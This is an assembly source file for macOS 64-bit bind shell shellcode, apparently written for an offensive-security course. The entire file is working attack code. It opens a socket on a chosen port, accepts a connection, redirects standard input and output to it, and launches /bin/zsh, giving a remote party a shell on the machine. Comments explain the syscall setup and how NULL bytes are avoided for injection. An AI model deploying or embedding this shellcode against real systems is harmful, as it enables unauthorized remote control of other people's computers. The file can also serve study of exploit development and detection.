; macOS_bind_shell_x64.nasm
; Author: Jack McBride (OS-40652)
; Website: https://jacklgmcbride.co.uk
;
; Purpose: OSMR macOS 64-bit bind shell shellcode
;

bits 64

global _main

_main:
; socket
push    0x2
pop     rdi                     ; RDI = AF_INET = 2
push    0x1
pop     rsi                     ; RSI = SOCK_STREAM = 1
xor     rdx, rdx                ; RDX = IPPROTO_IP = 0

; store syscall number in RAX
push    0x61                    ; put 97 on the stack (socket syscall#)
pop     rax                     ; pop 97 to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall                         ; trigger syscall
mov     r9, rax                 ; save socket number

; bind
mov     rdi, r9                 ; put saved socket fd value to RDI = socket fd

; Begin building the memory structure on the stack
xor     rsi, rsi                ; RSI = sin_zero[8] = 0x0000000000000000
push    rsi                     ;

; next entry on the stack should be 0x00000000 5c11 02 00 = (sin_addr .. sin_len)
mov     esi, PORT	        ; port sin_port=0x115c, sin_family=0x02, sin_len=0x00
dec     esi                     ; decrement ESI by 1 to resolve to correct value and avoid NULLs
push    rsi                     ; push RSI (=0x000000005c110200) to the stack
push    rsp
pop     rsi                     ; RSI = RSP = pointer to the structure

push    0x10
pop     rdx                     ; RDX = 0x10 (length of the socket structure - 16 bytes)

; store syscall number on RAX
push    0x68                    ; put 104 on the stack (bind syscall #)
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall                         ; trigger syscall

; listen
mov     rdi, r9                 ; put saved socket fd value to RDI
xor     rsi, rsi                ; RSI = 0

; store syscall number in RAX
push    0x6a                    ; put 106 on the stack (listen syscall #)
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall                         ; trigger syscall

; accept
mov     rdi, r9                 ; put saved fd value to RDI
xor     rsi, rsi                ; *address = RSI = 0
xor     rdx, rdx                ; *address_len = RDX = 0

; store syscall number in RAX
push    0x1e                    ; put 30 on the stack (accept syscall #)
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall                         ; trigger syscall
mov     r10, rax                ; save returned connection file descriptor into R10

; dup2
mov     rdi, r10                ; put the connection file descriptor into RDI
xor     rsi, rsi                ; set RSI = 0
push    0x5a                    ; put 90 on the stack (dup2 syscall #)
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
mov     r9, rax
syscall
inc     rsi                     ; increment RSI = 1
mov     rax, r9
syscall
inc rsi                         ; increment RSI = 2
mov     rax, r9
syscall

; execve
xor     rdx, rdx                ; zero our RDX
push    rdx                     ; push NULL string terminator
mov     rbx, '/bin/zsh'         ; move our string into RBX
push    rbx                     ; push the string we stored in RBX to the stack
mov     rdi, rsp                ; store the stack pointer in RDI
push    rdx                     ; argv[1] = 0
push    rdi                     ; argv[0] = /bin/zsh
mov     rsi, rsp                ; argv    = rsp - store RSP's value in RSI
push    59                      ; put 59 on the stack
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall
